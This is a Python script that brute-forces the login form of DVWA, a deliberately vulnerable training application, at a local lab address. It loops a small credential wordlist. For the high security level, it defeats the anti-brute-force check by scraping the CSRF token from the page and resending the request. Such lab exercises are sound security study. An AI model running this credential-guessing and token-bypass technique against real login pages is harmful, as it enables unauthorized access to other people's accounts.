"""
    Brute-force in DVWA
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa

"""
For the exploit in low, there's no protection for brute-force, so we can test as many tokens we want
It's the same for the medium difficulty, there is just a litte timeout, so it takes a little more of time but still works
"""

def exploit_low_med(sess):
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/brute/") # connect to the webpage
    #print(resp.text)
    
    wordlist = [
        ("admin", "4321"),
        ("user", "123"),
        ("user", "password"),
        ("user", "12345"),
        ("admin", "password")
    ] # build a wordlist for all tokens
    for index, cred in enumerate(wordlist): # For each element of the wordlist
        # index => current index
        # cred[0] => current user
        # cred[1] => current password
        print("> Testing "+cred[0]+" : "+cred[1])
        payload = {
            'username':cred[0],
            'password':cred[1],
            'Login':'Login'
        } # building the form values
        resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/brute/", params=payload) # send the form in GET method
        
        #print(resp.text)
        
        if("Username and/or password incorrect." not in resp.text):
            print("[+] Found tokens : "+cred[0]+" : "+cred[1])
            break
        else:
            print("Failed")
"""
For the high security, after a certain amount of attemps, it will abort telling us that the CSRF token is incorrect, but the CSRF token is located in the webpage, so we can just grab it and send it in the payload if we trigger the message
"""
def exploit_high(sess):
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/brute/") # connect to the webpage
    #print(resp.text)
    
    wordlist = [
        ("admin", "4321"),
        ("user", "123"),
        ("user", "password"),
        ("user", "12345"),
        ("admin", "password")
    ] # build a wordlist for all tokens
    for index, cred in enumerate(wordlist): # For each element of the wordlist
        # index => current index
        # cred[0] => current user
        # cred[1] => current password
        print("> Testing "+cred[0]+" : "+cred[1])
        payload = {
            'username':cred[0],
            'password':cred[1],
            'Login':'Login'
        } # building the form values
        
        resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/brute/", params=payload) # send the form in GET method
        
        #print(resp.text)
        
        if "CSRF token is incorrect" in resp.text: # If we trigger the CSRF security message
            payload['user_token'] = dvwa.get_token_id(resp) # We set the variable user_token to the token in the html code of the webpage
            
            resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/brute/", params=payload) # send the form in GET method to get the anwser
            
        #print(resp.text) 
        
        if("Username and/or password incorrect." not in resp.text):
            print("[+] Found tokens : "+cred[0]+" : "+cred[1])
            break
        else:
            print("Failed")
"""
Note that the impossible level is still possible but it will take way more time because we will have 15 minutes between each attemp
"""
            
def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "high")
    
    #print(sess.get("http://192.168.1.73/dvwa/").text)
    
    exploit_high(sess)
    
main()